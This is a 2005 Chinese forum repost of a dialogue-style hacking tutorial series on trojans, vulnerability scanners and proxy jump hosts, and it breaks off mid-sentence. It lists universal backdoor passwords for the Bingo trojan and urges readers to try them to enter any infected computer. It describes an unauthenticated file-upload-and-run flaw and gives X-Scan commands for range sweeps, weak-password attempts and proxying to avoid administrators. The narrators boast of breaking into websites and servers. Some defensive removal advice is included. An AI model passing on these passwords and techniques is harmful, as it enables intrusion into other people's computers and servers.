在众多的木马之中Cult of Dead Cow开发的Back Orific2000应该算是名气比较大的一个。这款软件是在Back Orific2.1的基础之上开发的，但是他最大的改动就是增加了对Windows NT服务器系列的支持。作为微软的高端产品，BO2000的这个功能无疑对Windows NT来说是致命的，就Windows NT本身而言，由于硬盘采取了NTSF的加密，普通的木马，包括冰河也无法控制，当然要想要让多数木马无法对Windows NT发挥作用最好将Windows NT转化为NTSF的格式下才会比较好用一些。 

　　而正因为如此BO2000才深得黑客高手的喜爱，因为他们感兴趣的也只有服务器，也只有Web Server才能够提起他们的胃口，那是一种来自深层感官的刺激。 

　　通常情况下木马大致可分为两个部分：服务器端程序和客户端程序。服务器端通常就是被控制端，也是我们传统概念上的木马了。 

　　二 

　　“你说BO2000好，但是绝大多数的杀毒招数都能够沟将其制服，而且我感觉他在使用上不如我手里的冰河锐利，况且我也不想黑什么服务器。我认为，个人电脑中隐藏有更大的宝藏，而且个人电脑脆弱的我能够利用任何一种方法摧毁它。 

　　“你说的很对，冰河确实锐利，而且称霸中华江湖一年之久，也可谓武林中少见的好兵刃，但是兵器虽然锋利，但兵器在打造的时候却留下来一个致命的缺点，这也是木马冰河为何在武林衰败的原因。” 

　　“这是一个什么样的弱点那？竟然如此致命？” 

　　“呵呵，说白了也很简单，冰河的作者在打造冰河2.X版本时就给它留下了一个后门，这个后门其实就是一个万能密码，只要拥有此密码，即便你中的冰河加了密码保护，到时候仍然行同虚设。” 

　　“什么！真有此事？想我许多朋友还因为冰河好用把它当作了一个免费的远程控制程序来用，如此这般，他们的机子岂不暴露无遗？” 

　　“呵呵，在黑客中瞒天过海、借花献佛这些阴险的招数都不算什么，多数木马软件的作者为了扩大自己的势力范围和争取主动权都会留一手，致命的一招。冰河的作者当然也不例外，而且由于作者钟爱许美静，所以每一个冰河中都包含许美静的歌词。当然作者为自己以后行事方便也留了几个万能密码。” 

　　“噢？万能密码？” 

　　“通常黑客在植入冰河这种木马的时候，为了维护自己的领地通常的要为自己的猎物加一个密码，只有输入正确的密码你才能够正常的控制对方的计算机，但是冰河的打造者为了方便自己的使用在冰河中加入了一个万能的密码，就像万能钥匙一样。冰河各版本的通用密码： 

　　2.2版：Can you speak Chinese? 
　　2.2版：05181977 
　　3.0版：yzkzero! 
　　4.0版：05181977 
　　3.0版：yzkzero.51.net 
　　3.0版：yzkzero! 
　　3.1-netbug版密码: 123456!@ 
　　2.2杀手专版：05181977 
　　2.2杀手专版：dzq20000! 

你可以试试看，是不是很轻松的就能够进入任何一台有冰河服务器端的电脑？” 

　　“真的进入了，果然有此事情，怪不得现在很多人都不再使用冰河。” 

　　“此外冰河还存在着两个严重的漏洞： 

　　漏洞一：不需要密码远程运行本地文件漏洞。 

　　具体的操作方法如下：我们选择使用相应的冰河客户端，2.2版以上服务端用2.2版客户端，1.2版服务端需要使用1.2版客户端控制。打开客户端程序G_Client，进入文件管理器，展开“我的电脑”选中任一个本地文件按右键弹出选择菜单，选择“远程打开”这时会报告口令错误，但是文件一样能上传并运行。 

　　任何人都可以利用这个漏洞上传一个冰河服务端就可以轻松获得机器的生死权限了，如果你高兴的话，还可以上传病毒和其它的木马。 

　　漏洞二：不需要密码就能用发送信息命令发送信息，不是用冰河信使，而是用控制类命令的发发送信息命令。” 

　　“当然这的确是一个原因，但更主要的是现在的多数杀毒软件都能克制冰河。” 

　　三 

　　木马通常会在三个地方做手脚：注册表、win.ini、system.ini。这三个文件都是电脑启动的时候需要加载到系统的重要文件，绝大部分木马使用这三种方式进行随机启动。当然也有利用捆绑软件方式启动的木马，木马phAse 1.0版本和NetBus 1.53版本就可以以捆绑方式装到目标电脑上，可以捆绑到启动程序上，也可以捆绑到一般程序的常用程序上。如果木马捆绑到一般的程序上，启动是不确定的，这要看目标电脑主人了，如果他不运行，木马就不会进入内存。捆绑方式是一种手动的安装方式，一般捆绑的是非自动方式启动的木马。非捆绑方式的木马因为会在注册表等位置留下痕迹，所以，很容易被发现，而捆绑木马可以由黑客自己确定捆绑方式、捆绑位置、捆绑程序等，位置的多变使木马有很强的隐蔽性。 

　　“在众多木马中，大多数都会将自己隐藏在Windows系统下面，通常为C:\Windows\目录或者C:\Windows\system\与C:\Windows\system32下隐藏。” 

　　“众多的目录中为何选择这两个目录？” 

　　“呵呵，当然是为了便于隐蔽。通常这几个目录为计算机的系统目录，其中的文件数量多而繁杂，很不容易辨别哪些是良性程序哪些是恶性程序，即便高手往往也会有失误删除的情况。而且，即便放置在系统目录下，就多数为重要的文件，这些文件的误删除往往会直接导致系统严重的瘫痪。” 

　　“原来如此。” 

　　“前辈，木马冰河是否也做了这些手脚？” 

　　“这是自然，木马一旦被植入目标计算机中要做的最重要的事就是如何在每次用户启动时自动装载服务端。冰河也是如此了。首先，冰河会在你的注册表中的HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run和RUNSERVICE 键值中加上了\kernl32.exe(是系统目录)， 

　　§c:\改动前的RUN下 
　　默认="" 
　　§c:\改动后的RUN下 
　　默认="C:\\WINDOWS\\SYSTEM\\Kernel32.exe" 
　　§c:\改动前RunServices下 
　　默认="" 
　　§c:\改动后RunServices下 
　　默认="C:\\WINDOWS\\SYSTEM\\Kernel32.exe" 
　　§c:\改动前[　　HKEY_LOCAL_MACHINE\Software\CLASSES\txtfile\shell\open\command]的： 
　　默认="Notepad.exe %1" 
　　§c:\改动后[　　HKEY_LOCAL_MACHINE\Software\CLASSES\txtfile\shell\open\command]的： 
　　默认="C:\\WINDOWS\\SYSTEM\\Sysexplr.exe %1" 

可以看出之所以冰河可以自我恢复主要靠的是C:\\WINDOWS\\SYSTEM\\Sysexplr.exe，而且冰河服务器端的编制是加密的，没法简单的通过改注册表得到或换掉。另外值得一提的是，即便你删除了这个键值，也并非平安大吉，冰河还会随时出来给你捣乱，主要因为冰河的服务端也会在c:\windows目录下生成一个叫 sysexplr.exe文件，当然这个目录会随你windows的安装目录变化而变化。 
 
　　“这个文件名好像超级解霸啊，冰河竟然如此狠毒。” 

　　“哈哈哈哈，你说的很对，也很聪明，这个文件的确很像超级解霸，但是这还是不够称得上为阴险，最为阴险的是这个文件是与文本文件相关联的，只要你打开文本，sysexplr.exe程序就会重新生成一个krnel32.exe，此时你的电脑还是被冰河控制著。而且如果你失误将sysexplr.exe程序破坏，你计算机的文本文件将无法打开。” 

　　木马都会很注意自己的端口，多达六万多中的端口很容易让我们迷失其中，如果你留意的话就会发现，通常情况下木马端口一般都在1000以上，并朝着越来越大的趋势发展。这主要是因为1000以下的端口是常用端口，况且用时占用这些端口可能会造成系统不正常，木马也就会很容易暴露；此外使用大的端口也会让你比较难发现隐藏其中的木马，如果使用远程扫描端口的方式查找木马，端口数越大，需要扫描的时间也就越多，故而使用诸如8765的端口会让你很难发现隐藏在其中的木马。 

　　四 

　　“既然木马如此的阴险，那么前辈有何可知木马的方法啊？” 

　　“现在的木马虽然阴险，但终究逃不过几个道理。平时出名的木马，杀毒软件就多数能够对付。但是现在木马种类繁多，有很多杀毒软件对付不了的。但是，只要我们谨记一下几个方法，就能够手到擒来。” 

　　“首先，我们可以选择端口扫描来进行判断，因为木马在被植入计算机后会打开计算机的端口，我们可以根据端口列表对计算机的端口进行分析。此外，查看连接也是一种好办法，而且在本地机上通过netstat -a（或某个第三方的程序）查看所有的TCP/UDP连接，查看连接要比端口扫描快，而且可以直观地发现与我们计算机连接的有哪些IP地址。当然，如果你对系统很熟悉的话，也可以通过检查注册表来进行木马的杀除，但是这个方法不适合于那些菜鸟级用户。查找木马特征文件也是一种好方法，就拿冰河来说……” 

　　“这个我知道前辈，木马冰河的特征文件一定是G_Server.exe。” 

　　“那有这么简单。冰河植入计算机后真正的特征文件是kernl32.exe和sysexlpr.exe。” 

　　“太狠毒了，一个跟系统内核文件一样，一个又像超级解霸。那么前辈我们把这两个文件删除掉，这冰河岂不就消失了。” 

　　“的确，你要是在DOS模式下删除了他们，冰河就被破坏掉了，但是你的计算机随之会无法打开文本文件，因为你删除的sysexplr.exe文件是和文本文件关联的，你还必须把文本文件跟notepad关联上。修改注册表太危险，你可以在Windows资源管理器中选择查看菜单的文件夹选项，再选择文件类型进行编辑。不过最简单的方法是按住键盘上的SHIFT键的同时鼠标右击任何一个TXT为后缀的文本文件，再选择打开方式，选中〖始终用该程序打开〗，然后找到notepad一项，选择打开就可以了。” 

　　“哈哈，按照前辈这么说来，我们只要抓住了这特征，天下的木马也奈何不了我们了。” 

　 







--------------------------------------------------------------------------------

-- 作者： longwu54
-- 发布时间： 2005/07/20 11:42am 

黑客常用兵器之木马篇（下） 


　五 

　　“哈哈，你可知道除了冰河这样的木马经常使用的隐身技术外，更新、更隐蔽的方法已经出现，这就是D驱动程序及动态链接库技术。驱动程序及动态链接库技术和一般的木马不同，它基本上摆脱了原有的木马模式D监听端口，而采用替代系统功能的方法改写驱动程序或动态链接库。这样做的结果是：系统中没有增加新的文件所以不能用扫描的方法查杀、不需要打开新的端口所以不能用端口监视的方法进行查杀、没有新的进程所以使用进程查看的方法发现不了它，也不能用kill进程的方法终止它的运行。在正常运行时木马几乎没有任何的症状，而一旦木马的控制端向被控端发出特定的信息后，隐藏的程序就立即开始运作。此类木马通过改写vxd文件建立隐藏共享的木马，甚是隐蔽，我们上面的那些方法根本不会对这类木马起作用。 

　　“可是前辈说的这种木马晚生并没有见到啊。” 

笨蛋！你没有见过，你怎么知道我老人家也没有见过？告诉你我已经看到了一个更加巧妙的木马，它就是Share。运行Share木马之前，我先把注册表以及所有硬盘上的文件数量、结构用一个监控软件DiskState记录了起来，这个监控软件使用128bit MD5的技术来捕获所有文件的状态，系统中的任何文件的变动都逃不过他的监视，这个软件均会将它们一一指出。” 

　　“前辈我这里第一次运行Share后，系统好像没有动静，使用Dllshow（内存进程察看软件）观看内存进程，似乎也没有太大的变化。一般木马都会马上在内存驻留的，或许此木马修改了硬盘上的文件。” 

　　“好，那么你就接着用DiskState比较运行share.exe前后的记录。” 

　　“程序显示windows\applog里面的目录的一些文件和system.dat、user.dat文件起了变化，并没有其他文件的增加和修改。” 

　　“系统中的applog目录里面存放了所有应用程序函数和程序调用的情况，而system.dat和user.dat则是组册表的组成文件。你把applog目录里面的share.lgc打开来观看，它的调用过程是什么？” 

　　“调用过程如下： 

　　c15625a0 92110 "C:\WINDOWS\SYSTEM\OLEAUT32.DLL" 
　　c1561d40 c1000 "C:\WINDOWS\SYSTEM\OLE32.DLL" 
　　c1553520 6000 "C:\WINDOWS\SYSTEM\INDICDLL.DLL" 
　　c15d4fd0 2623 "C:\WINDOWS\WIN.INI" 
　　c15645b0 8000 "C:\WINDOWS\SYSTEM\SVRAPI.DLL" 
　　c1554190 f000 "C:\WINDOWS\SYSTEM\MPR.DLL" 
　　c154d180 a1207 "C:\WINDOWS\SYSTEM\USER.EXE" 
　　c1555ef0 13000 "C:\WINDOWS\SYSTEM\MSNET32.DLL" 

　　但是为什么前辈我们看不到MSWINSCK.OCX或WSOCK2.VXD的调用呢？如果木马想要进行网络通讯，是会使用一些socket调用的。” 

　　“那么接着你再观察注册表的变化。” 
　　“好像在HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Network\LanMan下面，多了几个键值，分别是CJT_A$、CJT_C$、CJT_D$、CJT_E$、CJT_F$，其内部键值如下： 

　　"Flags"=dword:00000302 
　　"Type"=dword:00000000 
　　"Path"="A:\\" 《-----路径是A到F 
　　"Parm2enc"=hex: 
　　"Parm1enc"=hex: 
　　"Remark"="黑客帝国" 
　　” 
　　“这就对了，然后你在浏览器的地址栏输入\\111.111.111.1\CJT_C$。” 

　　“啊！居然把我的C盘目录文件显示出来了。” 
　　“现在你把CJT_C$改成matrix然后重启计算机，接着在浏览器的地址栏输入\\111.111.111.1\matrix。” 

　　“前辈也显示C盘目录文件了，很奇怪的是，在我的电脑里面硬盘看上去并没有共享啊？” 
　　“哈哈，那你再把"Flags"=dword:00000302的302改成402，reboot计算机。” 

　　“嘻嘻，硬盘共享已显示出来了。那么如何防止这种木马那？” 
“哈哈哈哈，这种木马只不过用了一个巧妙的方法隐藏起来而已。你现在把HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Network\LanMan下面的CJT_A$、CJT_C$、CJT_D$、CJT_E$、CJT_F$全部删掉。如果你还放心不下，也可以把windows\system\下面的Vserver.vxd（Microsoft 网络上的文件与打印机共享，虚拟设备驱动程序）删掉，再把[HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\VxD\下的VSERVER键值删掉。这样就可以了。另外，对于驱动程序/动态链接库木马，有一种方法可以试试，使用Windows的〖系统文件检查器〗，通过〖开始菜单〗－〖程序〗－〖附件〗－〖系统工具〗－〖系统信息〗－〖工具〗可以运行〖系统文件检查器〗，用〖系统文件检查器〗可检测操作系统文件的完整性，如果这些文件损坏，检查器可以将其还原，检查器还可以从安装盘中解压缩已压缩的文件。如果你的驱动程序或动态链接库在你没有升级它们的情况下被改动了，就有可能是木马，提取改动过的文件可以保证你的系统安全和稳定。” 

　　六 

　　“此外很多人中木马都会采用如下手段： 

　　1．先跟你套近乎，冒充成漂亮的美眉或者其他的能让你轻信的人，然后想方设法的骗你点他发给你的木马。 

　　2．把木马用工具和其它的软件捆绑在一起，然后在对文件名字进行修改，然后修改图标，利用这些虚假的伪装欺骗麻痹大意的人。 

　　3．另外一种方法就是把木马伪装好后，放在软件下载站中，着收渔翁之利。 

　　所以我这里提醒你一些常见的问题，首先是不要随便从小的个人网站上下载软件，要下也要到比较有名、比较有信誉的站点，通常这些网站的软件比较安全。其次不要过于相信别人，不能随便运行别人给的软件。而且要经常检查自己的系统文件、注册表、端口等，而且多注意些安全方面的信息。再者就是改掉windows关于隐藏文件后缀名的默认设置，这样可以让我们看清楚文件真正的后缀名字。最后要提醒你的是，如果有一天你突然发现自己的计算机硬盘莫名其妙的工作，或者在没有打开任何连接的情况下，猫还在眨眼睛，就立刻断线，进行木马的搜索。” 








--------------------------------------------------------------------------------

-- 作者： longwu54
-- 发布时间： 2005/07/20 11:42am 

黑客常用兵器之扫面篇（上） 

刀，兵器谱上排名第六。 
　　刀； 
　　一把好刀，光亮如雪； 
　　刃； 
　　一抹利刃，吹发即断； 

　　黑客手中的扫描器如同刺客手中之刀，杀人、保命；攻击、补漏。 

　　如果一个黑客手中没有一两个扫描器，那么他算不上是一个黑客，至少他是一个手里没有“刀”的黑客。没有“刀”的黑客是难以生存的……】 

　　“前辈，您为何如此看好扫描器？为什么黑客必须要有扫描器？” 

　　“后生，你上次木马害我不浅，你这次又像搞什么花样？” 

　　“上次小生只是跟前辈开了一个玩笑，还望前辈见谅。” 

　　“罢了，我老人家还不止于和你如此一般见识。此次你又有什么不清楚的？” 

　　“我不太清楚扫描器为何会像您所说的有如此大的威力，扫描器在黑客攻击中能起到什么作用？” 

　　“看来你现在也是一个手里没有刀的黑客，扫描器在一个成熟的黑客手里有着相当大的作用。因为进化到会用扫描器一级的黑客，他们就会很少有人在对那些无知的个人用户感兴趣，注意力更多的被吸引到了服务器上。而对付服务器最好的方法就是找到服务器系统的漏洞，或者服务器相关软件的漏洞。对于传统的手工查找来说，不但查找漏洞的速度过于缓慢，而且多数情况下只能针对某一个特定的漏洞，感觉有点大海捞针的味道。而扫描器就是一种快速寻找服务器系统相关漏洞的工具，通过它们，黑客可以根据自己的带宽和系统情况，以他们自己喜欢的速度和方式来快速的寻找系统漏洞，而且这多数扫描器可以同时扫描多种漏洞，很容易找到系统的漏洞和弱点，此时黑客就可以根据扫描器提供的漏洞报告和信息，采用合适的攻击方法对目标给以致命的一击。” 

　　“前辈，那我如何找到扫描器，平时我好像很少接触到这些东西啊。” 

　　“呵呵，你用过小榕的流光系列吗？” 

　　“这个当然是接触过了。” 

　　“其实小榕的流光就是一款结合强大扫描功能的软件，只不过他在流光中加入了一些攻击和破解成份。” 

“扫描器果然强大，我就曾用流光攻破过许多的黄色和反动网站，特别是他的FTP和新加入的SQLCMD功能，非常的强大。而且界面非常的友好，让我这种菜鸟用户很容易上手。” 


　　“你说的不错，但是虽然小榕的流光非常出色，并兼备强大的破解和攻击成份，但是总的来说它不能算的上是一个真正的扫描器。而且流光主要体现在破解，攻击性很强，没有太多的对目标系统扫描后的分析报告，所以流光在我看来只能算是是一个涵盖扫描功能的强大破解软件。” 

　　“那么在前辈的眼中，什么样的软件是一个强大的扫描软件，什么样的扫描器才能成为黑客手中的屠龙刀？” 

　　“一个好的扫描器必须有简洁和易于使用的操作界面，强大的分析和扫描信息范围，对最新漏洞的扫描判断能力（也就是通常所说的升级概念），详细的分析结果报告和对漏洞的描述与对策。这样的“刀”才能算的上是黑客手中的一把宝刀。” 

　　“前辈能否给我点评一下如今最为流行的扫描器的特点和性能呢？” 

　　“说道当今网络安全界流行的扫描器，其中最为优秀的就要算是ISS公司出品的商业扫描器了。它能针对上千种的系统和软件漏洞对服务器作出全面的细微扫描，而且能够生成比较详细的扫描报告，应该说是先进最好的扫描器了。” 

　　“前辈这个扫描器我可以从什么地方下载？” 

　　“无知！商业扫描器，当然是不能免费下载的了，你要花钱去买！” 

　　“还需要花钱啊，哪有没有不花钱的扫描器呢？” 

　　“当然有了，扫描器是黑客必备的工具之一，要是都花钱去买那不符合黑客的风格。我们可以在网上找到很多免费的而且同样很优秀的黑客扫描器。在国外比较常用的有Cerberus Internet Scanner简称CIS，还有乌克兰SATAN。我们国内的也有安全焦点的X-Scanner，与小榕的流光。” 

　　“前辈说的这几种扫描器我只用过流光，我个人认为流光很出色，其他的扫描器也只有所耳闻，但不知道有什么特点，还请前辈赐教。” 

　　“比起你用过的流光来说，ISS算得上是一个真正的管理员使用的系统扫描工具，首先它能扫描一些众所周知的系统漏洞和系统弱点，包括一些往往被用户忽略的问题，这些问题是一些经常被黑客利用的漏洞和弱点。ISS有更为强大的漏洞分析功能，并且它不会允许非法访问，但是实际情况是ISS已经背离了它的初衷目的。” 

　　“任何好的事物都有不利的一面，更何况一把刀，而且是把宝刀。” 

　　“这话不错，ISS的确是安全界最为出色的扫描器，而且他还是第一个可以公开得到的多层次扫描器。特别是它的可移植性和灵活性，众多的UNIX的平台上都可以运行ISS，ISS的扫描时间和效率也是很快的，很适合于企业级的用户。” 
“前辈，我插一句话，虽然ISS足够强大，但是它毕竟不是免费的午餐，这就不符合我们的黑客精神了。您那里有没有一些强大而且免费的扫描器？” 

　　“扫描器庞大的家族中怎么会没有免费的，你听说过NMAP吗？” 

　　“NMAP倒是有所耳闻，以前在许多安全网站上见到过这个名字，但是我不知道它是干什么用的一个东西。” 

　　“NMAP其实就是一个功能强大的扫描器。它的强大之处在于它支持UDP，TCP (connect)，TCP SYN(half open)，ftp proxy(bounce attack)，Reverse-ident，ICMP(ping sweep)，FIN，ACK sweep，Xmas Tree，SYN sweep，Null等多种扫描协议和扫描方式。但是总的来说它的最大的优点莫过于隐蔽性高，这是由于它采用的是“半开”的一种扫描方式，此外它提供的Stealth FIN，Xmas Tree与Null扫描模式更是让被扫描者难以发现。也正是因为这一点的原因，NMAP深受一些骨灰级黑客的喜爱。像一般黑客喜欢的秘密扫描、动态延迟、重发与平行扫描、欺骗扫描、端口过滤探测、RPC直接扫描、分布扫描等，NMAP均可以实现，可以说NMAP是一个灵活性很大的扫描器。通过强大系统的扫描，它还可以分析出服务器的端口处于Open状态还是被防火墙保护状态。总之它的强大是不言而喻的，如果你有一台联网的Linux或者UNIX计算机，那么你就可以去http://www.insecure.org/nmap/ 下载得到它。 








--------------------------------------------------------------------------------

-- 作者： longwu54
-- 发布时间： 2005/07/20 11:43am 

黑客常用兵器之扫描篇（下） 


　　“前辈，我的系统使用的是Windows，您能不能介绍一些我这种菜鸟级黑客也能用的扫描器？当然前提是在Windows系统下运行啊。” 

　　“既然这样，我想Cerberus Internet Scanner(CIS)可能比较合适与你，它主要运行在Windows NT和Windows2000的平台下面，当然它也主要是针对微软的Windows操作系统进行探测扫描的。CIS拥有绝大多数菜鸟喜欢的Windows友好界面，而且它提供进行扫描的安全问题也是通常在Windows中经常见到的，其中包括： 
　　（1） WWW服务 
　　（2） FTP服务 
　　（3） MS SQL Server 数据库扫描 
　　（4） NetBIOS 共享扫描 
　　（5） 注册表设置 
　　（6） NT服务漏洞 
　　（7） SMTP服务扫描 
　　（8） POP3服务扫描 
　　（9） RPC服务扫描 
　　（10） 端口映射 
　　（11） Finger服务 
　　（12） DNS安全扫描 
　　（13） 浏览器安全等 


　　在CIS中，它最为引人注目的还要数NetBIOS共享扫描。CIS能根据NetBIOS这一漏洞作出NETBIOS资源信息、共享资源、计算机用户名、工作组和薄弱的用户口令等详细的扫描分析。它的操作方法也是非常的容易，你只需要输入目标服务器的地址，然后选择你想要扫描的相关漏洞就可以进行扫描分析了。扫描完毕后他会主动生成一个HTML的报告共你分析结果。你可以在http://www.cerberus-infosec.co.uk/ 下载获得。” 

“这款扫描器的功能是否太过于简单了哪？我感觉它比起前几个您说的那些扫描器，功能过于少了，而且没有流光那么有成效。” 


　　“SATAN作为扫描器的鼻祖可能很适合你，由于它采用的是一个Perl的内核，通过PERL调用大量的C语言的检测工具对目标网站进行分析，所以你打开浏览器用IE方式就可以直接操作，使用也相对简单，我就不在这里介绍他浪费时间了。 

　　作为黑客的利刃，国产的CGI & Web Scanner也是一个不错的扫描器，这个宝刀是由zer9设计完成打造的。这款扫描器主要是针对动态网站技术的安全问题来设计的。” 

　　“动态网站？” 

　　“对，动态网站。随着网站设计的日趋复杂化，网站的技术人员会利用一些诸如CGI、ASP、PHP、JSP等网站动态交互技术与相应的服务软件对网站进行开发，这些东西大大地减轻了网站的维护和更新工作量，但是也正是这些技术，导致了大量的安全问题，特别是很多网站动态第三方程序在设计之初根本就没有对安全问题考虑太多，导致了大量的系统漏洞的出现。而CGI & Web Scanner就是专门针对这些动态的网页上出现的漏洞进行扫描的一把利刃。 

　　CGI & Web Scanner的主要功能有： 
　　（1） 检测203个已知的CGI漏洞 
　　（2） 通过HTTPD辨认服务器类型 
　　（3） 有更新漏洞的功能 
　　（4） Microsoft SQL Server DOS检测 
　　（5） Httpd Overflow检测 
　　（6） IIS Hack检测 
　　（7） ASP检测 
　　（8） DOT 漏洞检测 

　　而且它可以多线程扫描，并对常见的D.O.S（拒绝服务攻击）和Overflow等也进行探测，很适合初级杀手作为武器。至于你关心的使用方法，就更为简单了，输入目标服务器的IP地址，选择需要扫描的漏洞种类点击扫描按键，就开始了。” 


　　“没有想到国产扫描器还有如此优秀的！” 

　　“这个是自然，作为黑客的必备武器之一，国产扫描器有很多优秀的作品，前面我提到的安全焦点的X-Scanner，就是我最为欣赏的扫描器，而且我老人家也时常常的使用，但是不知道为什么，在对X-Scanner进行病毒测试的时候，熊猫和KV3000都能在X-Scanner里面发现两个木马程序。这一点是我们要非常的注意的。当然也要请安全焦点的朋友做做解释工作。” 

　　“前辈既然如此欣赏X-Scanner，那就给我详细介绍一下吧！” 


　　“X-Scanner运行在Windows平台下，它主要针对WindowsNT/Windows 2000操作系统的安全进行全面细致评估，可以扫描出很多Windows系统流行的漏洞，并详细的指出安全的脆弱环节与弥补措施。X-Scanner采用多线程方式对指定IP地址段(或单机)进行安全漏洞扫描，支持插件功能，提供了图形界面和命令行两种操作方式。 
　扫描范围包括： 
　　（1）标准端口状态及端口banner信息； 
　　（2）CGI漏洞； 
　　（3）RPC漏洞； 
　　（4）SQL-SERVER默认帐户； 
　　（5）FTP弱口令； 
　　（6）NT主机共享信息； 
　　（7）用户信息； 
　　（8）组信息； 
　　（9）NT主机弱口令用户等。 

　　X-Scanner会将扫描结果保存在/log/目录中，index_*.htm为扫描结果索引文件。并对于一些已知漏洞，X-Scanner给出了相应的漏洞描述，利用程序及解决方案。X-Scanner扫描的内容是绝大多数的服务器容易出现的漏洞和安全设置问题。最常用的还是其中的SQL默认帐户、FTP弱口令和共享扫描，他们能揭示出许多麻痹大意的网管犯的一些低级错误。” 


　　“前辈能不能具体说说X-Scanner如何使用呢？” 

　　“打开了X-Scanner，在扫描项目中可以任意的指定单独扫描哪一个特定的项目。比较多的是CGI和SQL或者FTP默认口令，这些都是很致命的服务器漏洞。” 


　　“下一步需要在〖扫描设置〗中进行参数的设置。一般的情况下，只对〖运行参数〗中的扫描范围进行设置。在那里只要填写网站服务器的IP地址就可以，可以填写一个来针对某一个特定的网站或服务器，也可以填写一个IP段范围，来扫描一段IP地址上所有的计算机。具体扫描参数格式如下： 

　　1.命令行：Xscan -h [起始地址]<-[终止地址]> [扫描选项] 

　　 其中的[扫描选项]含义如下： 
　　 -p: 扫描标准端口(端口列表可通过\dat\config.ini文件定制)； 
　　 -b: 获取开放端口的banner信息，需要与-p参数合用； 
　　 -c: 扫描CGI漏洞； 
　　 -r: 扫描RPC漏洞； 
　　 -s: 扫描SQL-SERVER默认帐户； 
　　 -f: 尝试FTP默认用户登录(用户名及口令可以通过\dat\config.ini文件定制)； 
　　 -n: 获取NetBios信息(若远程主机操作系统为Windows9x/NT4.0/2000)； 
　　 -g: 尝试弱口令用户连接(若远程主机操作系统为Windows NT4.0/2000)； 
　　 -a: 扫描以上全部内容； 

-x [代理服务器:端口]: 通过代理服务器扫描CGI漏洞； 
　　 -t: 设置线程数量，默认为20个线程； 
　　 -v: 显示详细扫描进度； 
　　 -d: 禁止扫描前PING被扫主机。 

　　2.示例： 
　　Xscan -h xxx.xxx.1.1-xxx.xxx.10.255 -a 
　　含义：扫描XXX.XXX.1.1-XXX.XXX.10.255网段内主机的所有信息； 

　　Xscan -h xxx.xxx.1.1 -n -g -t 30 
　　含义：获取XXX.XXX.1.1主机的Netbios信息，并检测NT弱口令用户，线程数量为30； 

　　Xscan -h xxx.xxx.1.1 -p -b -c -x 129.66.58.13:80 -v -d 
　　含义：扫描xxx.xxx.1.1主机的标准端口状态，通过代理服务器"129.66.58.13:80"扫描CGI漏洞，检测端口banner信息，且扫描前不通过PING命令检测主机状态，显示详细扫描进度。” 


　　“在〖运行参数〗中，有很大的选择余地，比如它可以设置代理服务器来躲避网管的追查，并课以设置扫描的线程。对扫描显示也可以进行详细的选择。然后扫描器就开始工作了。” 

　　“好啊，我去试试。” 

　　“另外我要提醒你注意的是，在使用这些扫描软件的时候一定要看清楚里面有没有可以的程序，以防自己先中了别人的招。此外，虽然你刺客手中有刀，但是现在的网站管理员也会使用这些宝刀，所以说，手中有绝世好刀，不一定就能杀死所有的敌人。好了，你去吧！” 








--------------------------------------------------------------------------------

-- 作者： longwu54
-- 发布时间： 2005/07/20 11:43am 

代理、肉鸡、跳板的概念 

看到有的网友还用那种8080、80端口的代理，我有话说，也可以说为大家做一点最最基础的黑客教程，大家看完自己去做吧，具体怎么做，我就不说了，可以说我把我所知道的肉鸡和跳板的概念知识全部告诉大家了，我也在几个地方发表过，这是我的原创，我要告诉大家的是真正在黑客抢劫服务器是用的跳板是什么，以及黑客们很少说的跳板知识介绍~~~~~~~~~~我有个习惯，
总是喜欢让大家看一篇文章的时候知道：为 什么要看这篇文章？这篇文章要让
自己知道或是学到什么东西，我尽量把自己所 掌握的东西尽量简化后用通俗的
语言表达。大家看完后有什么不好的地方，请指出，我好学习到新的东西，我很高兴自己能
把自己所学到的东西和大家分享，在 这里的认识的网友们有想成为黑客的；有
想随便玩玩；有的想学，但是不久就感
觉学网络安全很难就退却了。我真的很希望大家能找到自己的目标，做自己喜欢
的事情，不要一天就黑小企鹅和一天泡在别人的软件里（至少要尝试读一些简单的 

代码），学习黑客知识是孤独的，必须完全靠自己的努力，很少有人能帮你的， 

开始你会觉得很无助，但是慢慢的，你将习惯这种感觉和方式，要自己努力才会 

有成果的，我和大家一样也在不停的探索网络知识，现在不过是把自己学到的东 

西和大家分享罢了。是不是我象大姨妈啊！！呵呵~~~婆婆***！我看到很
多的网友聊代理的时候，概念很模糊，甚至搞出了笑话，所以今天我就谈谈很多
朋友初涉网安的一个 

误区（认识代理、跳板、肉鸡）。有的网友说那还不简单，找个运行就能隐藏IP 

的软件，我早说过了，我没有见过这种软件或许说根本不存在这种软件（懒惰的 

人更勤于此道）再者对抢劫服务器者而言把自己的身家性命放在一个隐藏自己IP的软件 

上是很不明智的，要知道抢劫服务器时会尝试很多的连接，在你一不小心的时候你就把 

自己卖了（我曾经在一次抢劫服务器完毕后没有用sc32设置好跳板的IE，而是随手在 

桌面上双击浏览器去看黑页，结果把自己给卖了，本来没有什么可怕的，但是我 

们要养成做任何事都无懈可击的习惯。再者~~~嘘嘘~~还好是日本鬼子的系统 

。）所以我根本不相信什么隐藏IP的软件，也许我孤陋寡闻或是真有这样的东西 

，但至少我是不会用的，除非有人张罗着把我毙了，那么我可以考虑一下。 

我要说此文适合菜鸟阅读，高手止步！！！ 

我上小企鹅，老有网友问我代理和跳板以及肉鸡是指同一类概念吗？它们怎么样工 

作的？ 

因为在小企鹅上不可能讲很清楚，涉及的东西太多了，因为此文是面向和我一样初 


人涉网络网络安全的朋友，那么我就简单的说说。 

首先是代理（泛指80；8080；1080端口），很多网友认为用代理猎手设置好 

端口之后就可以为自己找个代理在IE、FTP等里面设置后来隐藏IP，这就是肉鸡 

或认为这就是跳板，其实不然，为什么呢？就我个人来看这样的代理简直就是垃 

圾（有的网友不服气了，等等，我一会告诉你为什么我这么说），1、首先一个 

速度比较慢，我用这样的代理用过很多国家，包括国内的，感觉都是其慢，没有 

那种快速的感觉；2、不稳定。大家一定都想拥有一个稳定的代理吧~~~呵呵 

但是这样的代理通常有原因的，不是服务器自身漏洞就是为了自身利益而增加的 

服务，当他的愿望达成以后或是网管发现以后，你就不能再用了。3、多人使用。如果你 

用8080、1080、80等端口的代理，我敢保证这个代理不止你一个人用，如果 

你想成为一个黑客或是老手的话，拥有一个自己的代理是必须的。4、保密性。 

有的代理服务器提供者很可恶，他们利用代理得知你的密码或一些敏感信息，因 
